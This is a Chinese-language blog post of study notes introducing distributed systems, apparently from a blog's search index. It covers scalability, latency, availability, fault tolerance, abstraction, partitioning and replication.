    <content type="text"><![CDATA[分布式编程是一门关于在多台机器上实现，在一台机器上可以解决的问题，的哲学。 一般情况下，计算机系统有两种需要完成的基本任务：1.存储；2.计算，事实上，如果你拥有无限的内存以及无限的研发时间，我们根本不需要分布式（只考虑计算任务的情况），然而这很明显是不可能的事情。所以，我们很自然地就想通过增加机器来解决大数据问题。然而不幸的是，无脑增加机器不总是能提升解决问题的速度，特别是当机器数量达到一定程度时，由于网络通信时间的消耗，以及复制等各种操作，单纯的增加机器很难提升整个分布式集群的计算能力。所以研究分布式算法，特别是研究如何高效的整合多台机器以提供更加强有力的计算能力的方法，是非常有必要的。 Chapter1–Distributed systems at a high level author:sworduo date:Feb 25, Mon, 2019 参考:袖珍分布式系统（一） scalability and other good things许多问题在小规模下是很好解决的，但是同样的问题扩展到较大规模时就很容易让人感到绝望。比如让你去数一间房间里的人数，那时轻而易举的事情，但是让你去数一个国家的人数，难度就上天了。所以分布式系统要解决的第一个问题是规模的问题。具体来说，我们希望我们所设计的分布式系统在数据规模变大的情况下仍然游刃有余，至少，不能出现数量规模增长之后，计算能力陡然下降的情况，要能适应数据增大规模扩张的场景。有三种典型的scalability： size scalability:随着计算节点的增加，系统的计算能力也呈线性的增加，并且不会出现延迟变大的情况。 geographic scalability:能够在不同地方设立不同的数据中心，使得在南极和北极查询的速度都是一样的快，数据中心之间的数据延迟也应该很小才对。 administrative scalability:简单来说，就是当机器增加时，不能引入额外的管理成本（比如说管理机器和工作机器之间的比例，而不是管理机器的数量）。 有两个重要指标:1.performance和2.availability来衡量系统的性能。 performance(and latency)performan主要由以下三点来体现： 给定一定数量的工作，其响应时间应该很短（延迟很小）。 高吞吐率（加工时间） 低的计算资源使用率。（就是用尽可能少的资源完成尽可能多的事情） 以上三点很难兼得，然而大家普遍关注低延迟的情况，因为延迟时间受限于物理材质，很难通过其他py手段来解决延迟的问题。 Latency 什么是Latency：一个事件从发生到被观察到的时间间隔，比如说从你被僵尸咬了一口，到你真的变成僵尸这一段时期，可以理解为僵尸病毒的潜伏期 分布式中的latency：（这个我也不是很懂）加入一个分布式系统仅仅是返回其所存储的数字的和，比如说一个系统存储了1,2,3那么查询这个系统就会返回6。此时latency是指，你写入了一个新的数字4，到客户真正看到这个4给系统带来的变化的时间就叫做latency。当分布式系统内存储的数字不变时，latency应该是0（不考虑网络情况什么的）。 最低延迟时间：分布式系统中存在着必定会有的延迟时间，就是信息传播的速度以及每次操作中硬件带来的延时。 每次查询的最低延迟取决于1.操作本身的延时；2.信息传播的延时。 Availability (and fault tolerance) availability可以理解为分布式系统的有效时间，或者说是客户可以得到服务的时间，最理想的情况下，一个系统的availability等于开机时间/(开机时间+关机时间），这是没考虑断网等的理想情况。单机的availability就等于其所唯一依赖的机器的availability，而分布式系统的availability则等于所有提供同样服务的机器的availibility。 fault tolerance是指你给所有考虑到的错误设置相应的处理模式，使得当有给定的错误发生时，能执行相应的处理程序来解决这个错误。显然，你无法tolerate你没有考虑到的错误。就和try catch其实差不多，你只能处理你写好的catch的情况。 如何提升分布式系统的性能分布式系统的约束分布式系统主要受到两个物理因素的制约： 节点的数量（随着存储和计算能力的需求而提升） 节点之间的距离（影响信息传播的速度）在上面的限制条件下： 独立节点数量的提升将会提高系统出错的概率（降低availibility和增加administrative costs) 独立节点数量的提升可能会增加节点之间的交流成本。（也即是随着节点规模的增加，性能并不能呈线性提升） 节点隔得越远，信息传播的最低延迟时间将会越长。 剔除上面这些基于物理限制的制约因素之后，才真正到达考虑系统设计的范畴。 分布式的performance和availability取决于分布式系统对客户的保证。比如说，一个分布式系统可能能保证在1分钟内让全世界的客户看到某个人在某个地方进行的写操作；又比如，一个分布式保证了某个人在系统上存储的数据可以保存至少一年不丢失；再比如，一个分布式系统可能保证某个大任务的计算时间和其规模呈正比等等。一个分布式系统的性能由其提供的服务和实际的使用体验来保证。 事实上，制约分布式系统性能的还有另外一个重要的因素：设计分布式系统的人的经验和能力。我们常常会遇到错误和异常，错误是指在你预料之中的偏离正确相应的反应，异常是指在你意料之外的系统反应，显然，如果你足够聪明和经验丰富，那么错误就会越多，异常就会越少，而错误是可以提前预料并设置应对措施的，因此系统健壮性也就越高。 Abstractions and models 抽象：隐藏和问题无关的细节，使得系统更加易于研发。一个优秀的抽象能使得系统更加容易让人理解，以及便于开发人员找到问题的关键。 model：用一种更为精确方式来描述系统的关键特性。 抽象和模块化的程度的选择是一个trade-off，就好像c语言和python的差别。python隐藏了很多底层操作系统的细节，易于理解和开发，然而效率低下；c语言贴合底层，性能优越，但是对小白不友好。 partition and replicate有两种可以作用于要处理的数据集的方法： partition:将数据集划分为互斥的子集，便于并行处理。 replicate:在多台机器保存同一个数据的副本，用于减少查询时间以及提高容错率。 partition 通过限制每个节点所要处理的数据规模以及在同一数据分片内寻找相关数据来提升性能。（有点类似操作系统里面的，先索引分块，再顺序查找） 分块之后，各个节点将是相互独立的，不会因为一个节点失效而使得整个系统瘫痪，增加系统允许的失效节点的数量，提高系统的健壮性。 一般而言，数据是针对具体任务要求而进行划分的，很难归纳出一个通用的数据划分的方法，所以更进一步的分析将会在后续章节结合具体事例来讲述。总的来说，数据要以系统的访问模式来进行划分。比如说查询较多的任务，尽量把相关的数据放在一起，以提高查询速度；计算较多的任务，尽量把不相关的数据放在一起，提升并行性等等。 replicatereplicate就是在多台机器上存储同一个数据的备份，使得更多的服务器参与到计算中。有个大佬说：···复制！生活中所有问题的起源和解决方法。···有种人类本质复读机的感觉。 优势：通过replicate，可以提升系统的扩展性，性能和容错率。 劣势：replication也带来了一系列的问题，比如说同一个数据的副本存在于多台机器中，那么当某一台机器上的副本被修改时，其他机器也理应作相应的修改，这就引入了额外的通信成本。]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
</search>
